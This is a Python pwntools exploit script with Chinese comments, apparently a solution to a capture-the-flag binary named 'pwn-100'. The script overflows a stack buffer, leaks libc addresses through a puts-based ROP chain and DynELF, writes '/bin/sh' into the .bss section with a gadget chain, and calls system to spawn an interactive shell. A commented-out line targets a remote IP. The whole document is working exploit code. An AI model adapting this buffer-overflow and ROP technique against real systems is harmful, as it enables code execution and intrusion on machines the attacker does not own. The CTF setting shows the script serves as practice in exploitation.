#!/usr/bin/env python3
from pwn import *

# 连接目标服务器
# r = remote("192.168.79.130", 52760)  # 通过网络连接目标服务器
r = process('./pwn-100')  # 本地运行目标二进制文件
elf = ELF('./pwn-100')  # 加载目标二进制文件信息

rop1 = 0x40075A  # pop r13; pop r14; pop r15; ret; 的地址
rop2 = 0x400740  # mov qword ptr [r13], r14; ret; 的地址
pop_rdi = 0x400763  # pop rdi; ret; 的地址
start_addr = 0x400550  # main 函数的地址
puts_plt = elf.plt['puts']  # puts 函数的地址
read_got = elf.got['read']  # read 函数的 GOT 表项地址
binsh_addr = 0x601000  # 存放 "/bin/sh" 字符串的地址
fillchar = b'A' * 0x48  # 填充字符

# 用于泄露内存中的数据
def leak(address):
    payload = fillchar
    payload += p64(pop_rdi)
    payload += p64(address)
    payload += p64(puts_plt)
    payload += p64(start_addr)
    payload = payload.ljust(200, b'A')
    r.send(payload)
    r.recvuntil(b"bye~\n")
    count = 0
    content = b''
    up = b''
    while True:
        c = r.recv(numb=1, timeout=0.5)
        count += 1
        if up == b'\n' and c == b'':
            content = content[:-1] + b'\x00'
            break
        else:
            content += c
            up = c
    content = content[:4]
    log.info("%#x => %s" % (address, (content or b'').hex()))
    return content

# 构建 DynELF 对象，用于获取 libc 中的函数地址
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')  # 获取 system 函数在 libc 中的地址
print("system_addr", hex(system_addr))

# 将 "/bin/sh" 字符串写入 .bss 段
print("----------write /bin/sh to bss----------")
payload = fillchar
payload += p64(rop1)
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(binsh_addr)
payload += p64(1)
payload += p64(rop2)
payload += b'A' * 56
payload += p64(start_addr)
payload = payload.ljust(200, b'A')
r.send(payload)
r.recvuntil(b"bye~\n")
r.send(b"/bin/sh\x00")

# 执行 system("/bin/sh")
print("-----------get shell----------")
payload = fillchar
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
payload = payload.ljust(200, b'A')
r.send(payload)

# 进入交互模式，与 shell 进行交互
r.interactive()
